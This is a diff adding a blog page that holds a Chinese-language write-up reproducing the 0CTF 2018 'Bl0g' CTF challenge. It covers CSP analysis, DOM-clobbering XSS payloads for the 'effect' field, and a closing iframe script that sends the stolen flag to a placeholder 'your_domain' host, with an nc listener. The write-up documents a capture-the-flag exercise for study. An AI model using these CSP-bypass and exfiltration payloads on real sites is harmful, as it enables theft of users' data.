@@ -1,0 +1,753 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=6.6.0" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.6.0">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.6.0">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.6.0" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '6.6.0',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="参考文献：https://lorexxar.cn/2018/04/05/0ctf2018-blog/                  https://45.76.198.31/post/0CTF%202018%20Quals%20Bl0g%20writeup        CSP：https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/">
+<meta property="og:type" content="website">
+<meta property="og:title" content="cws6">
+<meta property="og:url" content="https://cws6.github.io/user-5035860-1543717448/ctf记录/复现0ctf-blog.html">
+<meta property="og:site_name" content="cws6">
+<meta property="og:description" content="参考文献：https://lorexxar.cn/2018/04/05/0ctf2018-blog/                  https://45.76.198.31/post/0CTF%202018%20Quals%20Bl0g%20writeup        CSP：https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2018-12-02T02:24:09.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="cws6">
+<meta name="twitter:description" content="参考文献：https://lorexxar.cn/2018/04/05/0ctf2018-blog/                  https://45.76.198.31/post/0CTF%202018%20Quals%20Bl0g%20writeup        CSP：https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/">
+
+
+
+
+
+
+  <link rel="canonical" href="https://cws6.github.io/user-5035860-1543717448/ctf记录/复现0ctf-blog.html">
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title> | cws6</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <a href="https://github.com/cws6"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://s3.amazonaws.com/github/ribbons/forkme_right_darkblue_121621.png" alt="Fork me on GitHub"></a>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">cws6</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">空巢老人</p>
+      
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+    
+
+    
+    
+      
+      
+    
+      
+      
+    
+      
+      
+    
+    
+
+  
+
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+    
+    
+    <div class="post-block page">
+      <header class="post-header">
+
+<h1 class="post-title" itemprop="name headline"></h1>
+
+<div class="post-meta">
+  
+  
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/">USER-5035860-1543717448</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li>CTF记录</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/复现0ctf-blog.html/">复现0CTF-BLOG.HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+</div>
+
+</header>
+
+      
+      
+      
+      <div class="post-body">
+        
+        
+          <p>参考文献：<a href="https://lorexxar.cn/2018/04/05/0ctf2018-blog/" target="_blank" rel="noopener">https://lorexxar.cn/2018/04/05/0ctf2018-blog/</a><br>                  <a href="https://45.76.198.31/post/0CTF%202018%20Quals%20Bl0g%20writeup" target="_blank" rel="noopener">https://45.76.198.31/post/0CTF%202018%20Quals%20Bl0g%20writeup</a><br>        CSP：<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src" target="_blank" rel="noopener">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src</a><br>利用window.name+iframe跨域获取数:<a href="http://www.cnblogs.com/zichi/p/4620656.html" target="_blank" rel="noopener">http://www.cnblogs.com/zichi/p/4620656.html</a><br><strong>站内的功能：</strong></p>
+<ul>
+<li>New 写文章并提交</li>
+<li>article/xx 查看文章/评论</li>
+<li>submit 提交url (start with <em><a href="http://202.120.7.197:8090" target="_blank" rel="noopener">http://202.120.7.197:8090</a></em>)</li>
+<li>flag flag{ONLY_4dmin_can_r3ad_7h!s}</li>
+</ul>
+<p>①<strong>在响应头中可以看到CSP</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:script-src &apos;self&apos; &apos;unsafe-inline&apos;</span><br><span class="line">Content-Security-Policy:default-src &apos;none&apos;; script-src &apos;nonce-+AqBwcppQYhunm0hOq5iEIBH+LI=&apos; &apos;strict-dynamic&apos;; style-src &apos;self&apos;; img-src &apos;self&apos; data:; media-src &apos;self&apos;; font-src &apos;self&apos; data:; connect-src &apos;self&apos;; base-uri &apos;none&apos;</span><br></pre></td></tr></table></figure></p>
+<p>其中</p>
+<ul>
+<li><code>script-src &#39;self&#39; &#39;unsafe-inline&#39;</code>：允许使用内联资源，如内联<code>&lt;script&gt;</code>元素， <code>javascript:</code> URL，内联事件处理程序和内联<code>&lt;style&gt;</code>元素</li>
+<li><p><code>script-src &#39;nonce-+AqBwcppQYhunm0hOq5iEIBH+LI=&#39; &#39;strict-dynamic&#39;</code>：<code>&#39;strict-dynamic &#39;</code>源表达式指定显式给予标记中存在的脚本的信任，通过附加一个随机数或散列，应该传播给由该脚本加载的所有脚本。 同时，任何白名单或源表达式，例如<code>&#39;self&#39;</code>或<code>&#39;unsafe-inline&#39;</code>都将被忽略。<code>strict-dynamic</code>对因为<code>nonce-{random}</code>匹配或者<code>hash</code>匹配（例如 <code>sha256-{sha256sum}、sha512-{sha512sum}</code>等）而加载的 js 代码赋予一定程度的信任，允许他们操作 DOM 来加载其他的 js&gt;。 例如，像<code>script-src &#39;strict-dynamic&#39; &#39;nonce-R4nd0m&#39; https://1.com/</code>将允许加载一个具有<code>&lt;script nonce=&quot;R4nd0m&quot; src=&quot;https://2.com/a.js&quot;&gt;</code> ，并将该信任传播给由a.js加载的任何脚本，但不允许从<code>https://1.com/</code>加载脚本，除非伴随着一个随机数或从可信脚本加载。</p>
+</li>
+<li><p><code>base-uri &#39;none&#39;</code>代表不能通过修改根域来实现攻击；</p>
+</li>
+<li><code>default-src &#39;none&#39;</code>定义针对所有类型（js、image、css、web font，ajax请求，iframe，多媒体等）资源的默认加载策略，某类型资源如果没有单独定义策略，就使用默认的。这其中包含了iframe-src，这代表攻击方式一定在站内实现<br>*<code>script-src</code>的双限制代表我们只能通过<code>&lt;script&gt;{eval_code}&lt;/script&gt;</code>的方式来实现攻击。</li>
+</ul>
+<p><strong>两个CSP分开写，是同时生效并且单独生效的，也就是与的关系。<br>换个说法就是，假设我们通过动态生成script标签的方式，成功绕过了第二个CSP，但我们引入了<script src="your.website">，就会被第一条CSP拦截。</strong></p>
+<p>②<strong>new中有一个字段是effect，是设置特效的</strong><br>effect字段会插入到页面中的<input type="hidden" id="effect" value="{effect_value}">，但这里实际上是没有任何过滤的，也就是说我们可以通过闭合这个标签并插入我们想要的标签，需要注意的是，这个点只能插入70个字符。<br><strong>config.js里定义了 effects 变量</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">var effects = &#123;</span><br><span class="line">    &apos;nest&apos;: [</span><br><span class="line">        &apos;&lt;script src=&quot;/assets/js/effects/canvas-nest.min.js&quot;&gt;&lt;/script&gt;&apos;</span><br><span class="line">    ],</span><br><span class="line">    &apos;3waves&apos;: [</span><br><span class="line">        &apos;&lt;script src=&quot;/assets/js/effects/three.min.js&quot;&gt;&lt;/script&gt;&apos;,</span><br><span class="line">        &apos;&lt;script src=&quot;/assets/js/effects/three-waves.min.js&quot;&gt;&lt;/script&gt;&apos;</span><br><span class="line">    ],</span><br><span class="line">    &apos;lines&apos;: [</span><br><span class="line">        &apos;&lt;script src=&quot;/assets/js/effects/three.min.js&quot;&gt;&lt;/script&gt;&apos;,</span><br><span class="line">        &apos;&lt;script src=&quot;/assets/js/effects/canvas-lines.min.js&quot;&gt;&lt;/script&gt;&apos;</span><br><span class="line">    ],</span><br><span class="line">    &apos;sphere&apos;: [</span><br><span class="line">        &apos;&lt;script src=&quot;/assets/js/effects/three.min.js&quot;&gt;&lt;/script&gt;&apos;,</span><br><span class="line">        &apos;&lt;script src=&quot;/assets/js/effects/canvas-sphere.min.js&quot;&gt;&lt;/script&gt;&apos;</span><br><span class="line">    ],</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p><strong>article.js是取页面中 name=”effect” 元素的值作为 effects 的下标，通过 jQuery 的 append() 追加的页面中</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(document).ready(function()&#123;</span><br><span class="line">    $(&quot;body&quot;).append((effects[$(&quot;#effect&quot;).val()]));</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></p>
+<p><strong>effects 是可以被我们劫持的：</strong><br><img src="https://upload-images.jianshu.io/upload_images/5035860-fc54e103f7e321db.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script a=&quot;</span><br><span class="line">&lt;script nonce=&quot;testtt&quot;&gt;...</span><br><span class="line">浏览器有一定的容错能力，他会补足不完整的标签</span><br><span class="line">=====&gt;</span><br><span class="line">&lt;script a=&quot;&lt;script&quot; nonce=&quot;test&quot;&gt;...</span><br></pre></td></tr></table></figure></p>
+<p>覆盖<code>effects[$(&quot;#effect&quot;).val()]</code>，这里我们选择id属性（这里其实是为了id会使用两次，可以更省位数），尝试传入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&quot;&gt;&lt;form name=effects id=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-5f1401a481fc510c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"><br><img src="https://upload-images.jianshu.io/upload_images/5035860-9b27e5bd3a97c569.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
+<p>通过jquery get获取flag内容，通过箭头函数将返回赋值给<code>window.name</code>，紧接着，我们需要想办法获取这里的<code>window.name</code>(window.name不跟随域变化而变化，通过window.name我们可以缓存原本的数据。)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&quot;&gt;&lt;form name=effects id=&quot;&lt;script&gt;$.get(&apos;/flag&apos;,e=&gt;name=e)&quot;&gt;&lt;script&gt;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://upload-images.jianshu.io/upload_images/5035860-e5c06e896b3c383c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"><br><strong>通过iframe 读取 window.name里的内容：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://202.120.7.197:8090/article/3855&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">	setTimeout(()=&gt;&#123;frames[0].window.location.href=&apos;/&apos;&#125;,1200)//当前页面打开URL页面</span><br><span class="line">	setTimeout(()=&gt;&#123;location.href=&apos;http://your_domain/?&apos;+frames[0].window.name&#125;,1500)//当前页面打开URL页面</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p>最后nc连接查看：<code>nc -lp 8989</code></p>
+</script></strong></p>
+        
+      </div>
+      
+      
+      
+    </div>
+    
+
+
+  
+  
+  <ul class="breadcrumb">
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/">USER-5035860-1543717448</a></li>
+          
+            
+          
+        
+      
+    
+      
+      
+        
+          <li>CTF记录</li>
+        
+      
+    
+      
+      
+        
+          <li><a href="/user-5035860-1543717448/复现0ctf-blog.html/">复现0CTF-BLOG.HTML</a></li>
+          
+            
+          
+        
+      
+    
+  </ul>
+
+
+    
+    
+    
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+
+      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">cws6</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  <a href="/tags/index.html">
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">3</span>
+                    <span class="site-state-item-name">tags</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+
+          
+
+          
+
+          
+          
+
+          
+            
+          
+          
+
+        </div>
+      </section>
+
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">cws6</span>
+
+  
+
+  
+</div>
+
+<div class="powered-by">
+<i class="fa fa-user-md"></i><span id="busuanzi_container_site_uv">
+  本站访客数:<span id="busuanzi_value_site_uv"></span>
+</span>
+</div>
+
+<!-- 
+  <div class="powered-by">Powered by <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.8.0</div>
+
+-->
+
+
+  <span class="post-meta-divider">|</span>
+
+
+<!-- 
+  <div class="theme-info">Theme – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> v6.6.0</div>
+
+-->
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+	
+    
+
+    
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+    
+      
+  
+  <script type="text/javascript" color="0,0,255" opacity="0.5" zindex="-1" count="99" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.6.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.6.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.6.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.6.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.6.0"></script>
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+<script type="text/javascript" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+
+</body>
+</html>
